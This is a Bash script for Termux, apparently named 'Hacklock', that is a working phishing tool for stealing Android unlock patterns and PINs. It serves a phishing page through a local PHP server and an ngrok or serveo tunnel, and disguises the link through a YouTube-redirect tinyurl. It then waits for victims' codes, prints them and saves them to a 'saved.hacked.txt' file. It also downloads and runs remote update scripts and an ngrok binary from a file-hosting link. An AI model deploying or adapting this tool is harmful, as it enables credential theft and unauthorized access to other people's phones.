#!/bin/bash
# Hacklock by Nitro
#youtube.com/noobhackers
#not for illegel use
#pattern phishing tool for termux no root.
clear
echo
echo
echo
trap 'printf "\n";stop;exit 1' 2
loc=/data/data/com.termux/files/home/hacklock/setup
if [ -f "$loc" ]; then
cd $HOME/hacklock
bash setup
fi
clear
check(){
if wget --spider https://raw.githubusercontent.com/noob-hackers/hacklock/master/update.v1.4 2>/dev/null; then
cd $HOME/hacklock/core/update
echo "pin" > update.txt
else
echo
fi
}
check
option(){
if [ -f "$HOME/hacklock/core/update/update.txt" ];then
cd $HOME/hacklock/core/update
bash update.sh
else
echo " "
fi
}
option
check1(){
if wget --spider https://raw.githubusercontent.com/noob-hackers/patchupdateznh/main/hacklockpatch.v.1 2>/dev/null; then
cd $HOME/hacklock/core/update
echo "ttttt" > patch.txt
else
echo
fi
}
check1
option1(){
if [ -f "$HOME/mrphish/core/update/patch.txt" ];then
cd $HOME/hacklock/core/update
bash patch.sh
else
echo " "
fi
}
option1
dependencies() {

command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }

}

menu() {

printf "\e[1;92m[\e[0m\e[1;77m1\e[0m\e[1;92m]\e[0m\e[1;93m Hack pattern\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m2\e[0m\e[1;92m]\e[0m\e[1;93m More Tools\e[0m\n"
#printf "\e[1;92m[\e[0m\e[1;77m3\e[0m\e[1;92m]\e[0m\e[1;93m Video\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m3\e[0m\e[1;92m]\e[0m\e[1;93m Chat\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m4\e[0m\e[1;92m]\e[0m\e[1;93m Fix \e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m5\e[0m\e[1;92m]\e[0m\e[1;93m Follow\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m6\e[0m\e[1;92m]\e[0m\e[1;93m Update\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m7\e[0m\e[1;92m]\e[0m\e[1;93m About \e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m8\e[0m\e[1;92m]\e[0m\e[1;93m Subscribe\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m9\e[0m\e[1;92m]\e[0m\e[1;93m Exit\e[0m\n"
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m' option


if [[ $option == 1 || $option == 01 ]]; then
server="pattern"
start1
elif [[ $option == 2 || $option == 02 ]]; then
am start -a android.intent.action.VIEW -d https://bit.ly/3aP8DJD > /dev/null 2>&1 
elif [[ $option == 3 || $option == 03 ]]; then
am start -a android.intent.action.VIEW -d https://bit.ly/nhwhatschat > /dev/null 2>&1 
elif [[ $option == 4 || $option == 04 ]]; then
fixer
elif [[ $option == 5 || $option == 05 ]]; then
am start -a android.intent.action.VIEW -d https://bit.ly/nhfollowus > /dev/null 2>&1 
elif [[ $option == 6 || $option == 06 ]]; then
cd $HOME/hacklock/core/update/
bash update.sh
elif [[ $option == 7 || $option == 07 ]]; then
cd $HOME/hacklock/core/about/
bash about.sh
elif [[ $option == 8 || $option == 08 ]]; then
am start -a android.intent.action.VIEW -d https://bitly.com/nhytchannel > /dev/null 2>&1 
elif [[ $option == 9 ]]; then
exit 1
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
banner
dependencies
menu
fi
}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
pkill -f -2 ssh > /dev/null 2>&1
killall ssh > /dev/null 2>&1
fi
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

}

banner() {
printf "\n"
printf "\e[1;92m  _|    _|                      _|        _|                            _|\e[0m\n"
printf "\e[1;92m  _|    _|    _|_|_|    _|_|_|  _|  _|    _|          _|_|      _|_|_|  _|  _| \e[0m\n"
printf "\e[1;92m  _|_|_|_|  _|    _|  _|        _|_|      _|        _|    _|  _|        _|_\e[0m\n"
printf "\e[1;92m  _|    _|  _|    _|  _|        _|  _|    _|        _|    _|  _|        _|  _|\e[0m\n"
printf "\e[1;92m  _|    _|    _|_|_|    _|_|_|  _|    _|  _|_|_|_|    _|_|      _|_|_|  _|    _| v1.2 \e[0m\n"
printf "\n"
printf "                  \e[104m\e[1;77m  >>  Script By N17R0 << \e[0m\n"
printf "\n"
printf "           \e[100m\e[1;77m >>  Youtube Channel : \e[1;96m Noob Hackers \e[100m\e[1;77m << \e[0m\n"
printf "\n"
printf "    \e[101m\e[1;77m #>   Note: Turn on mobile hotspot to get link.....!  <# \e[0m\n"
printf "\n"
}

catch_cred() {

IFS=$'\n'
password=$(grep -o 'Pass:.*' core/$server/usernames.txt | cut -d ":" -f2)
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Pattern-pin:\e[0m\e[1;77m %s\n\e[0m" $password
cat core/$server/usernames.txt >> core/$server/saved.hacked.txt
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m core/%s/saved.hacked.txt\e[0m\n" $server
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting For Next Pin, Press Ctrl + C to exit...\e[0m\n"

}

serverx() {
printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
cd core/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting server...\e[0m\n"
command -v ssh > /dev/null 2>&1 || { echo >&2 "I require SSH but it's not installed. Install it. Aborting."; exit 1; }
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > sendlink ' &
printf "\n"
sleep 10
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf "\n"
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the direct link to target:\e[0m\e[1;77m %s \n' $send_link

send_ip=$(curl -s "http://tinyurl.com/api-create.php?url=https://www.youtube.com/redirect?v=636B9Qh-fqU&redir_token=j8GGFy4s0H5jIRVfuChglne9fQB8MTU4MjM5MzM0N0AxNTgyMzA2OTQ3&event=video_description&q=$send_link" | head -n1)
#send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
printf "\n"
checkfound
}

startx() {
if [[ -e core/$server/ip.txt ]]; then
rm -rf core/$server/ip.txt

fi
if [[ -e core/$server/usernames.txt ]]; then
rm -rf core/$server/usernames.txt

fi

default_port="3333" #$(seq 1111 4444 | sort -R | head -n1)
printf '\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port
read port
port="${port:-${default_port}}"
serverx

}


start() {
if [[ -e core/$server/ip.txt ]]; then
rm -rf core/$server/ip.txt

fi
if [[ -e core/$server/usernames.txt ]]; then
rm -rf core/$server/usernames.txt

fi

if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m*\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget https://download2283.mediafire.com/zbyvn6rzvaog/fxrbagkj5bj8d80/ngrok+wifi%2Bdata.zip > /dev/null 2>&1

if [[ -e ngrok-wifi-data.zip ]]; then
unzip ngrok-wifi-data.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-wifi-data.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi



else
wget https://download2283.mediafire.com/zbyvn6rzvaog/fxrbagkj5bj8d80/ngrok+wifi%2Bdata.zip > /dev/null 2>&1 
if [[ -e ngrok-wifi-data.zip ]]; then
unzip ngrok-wifi-data.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-wifi-data.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
cd core/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
./ngrok http 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io")
printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Target:\e[0m\e[1;77m %s\e[0m\n" $link
send_ip=$(curl -s "http://tinyurl.com/api-create.php?url=https://www.youtube.com/redirect?v=636B9Qh-fqU&redir_token=j8GGFy4s0H5jIRVfuChglne9fQB8MTU4MjM5MzM0N0AxNTgyMzA2OTQ3&event=video_description&q=$link" | head -n1)
#send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
printf "\n"

checkfound
}

start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi


#printf "\n"
#printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net (SSH Tunneling, Best!)\e[0m\n"
#printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
#default_option_server="1"
#read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m' option_server
#option_server="${option_server:-${default_option_server}}"
#if [[ $option_server == 1 || $option_server == 01 ]]; then
#startx

#elif [[ $option_server == 2 || $option_server == 02 ]]; then
start
#else
#printf "\e[1;93m [!] Invalid option!\e[0m\n"
#sleep 1
#clear
#start1
#fi

}
fixer(){
  clear
  cd $HOME
  ls -a >/dev/null 2>&1
  rm -rf .ngrok2 >/dev/null 2>&1
  printf "\e[1;92m WATCH THIS VIDEO www.noob-hackers.com\e[0m\n"
read -p $'\n\e[1;96m[\e[0m\e[1;92m+\e[0m\e[1;96m] NGROK AUTH CODE : \e[0m' name
./ngrok authtoken $name >/dev/null 2>&1
printf "\e[1;92m[\e[0m*\e[1;92m] NGROK FIXED SUCCESSFULLY:\e[0m\e[1;77m %s\e[0m\n"
printf "\e[1;92m[\e[0m*\e[1;92m] IF ITS NOT SOLVED THEN USE OPTION CHAT\e[0m\e[1;77m %s\e[0m\n"
sleep 6.0
bash main.sh
}



checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting For Pin,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do

if [[ -e "core/$server/usernames.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Pattern  Found!\n"
catch_cred
rm -rf core/$server/usernames.txt
fi
sleep 0.5

done 

}
banner
dependencies
menu
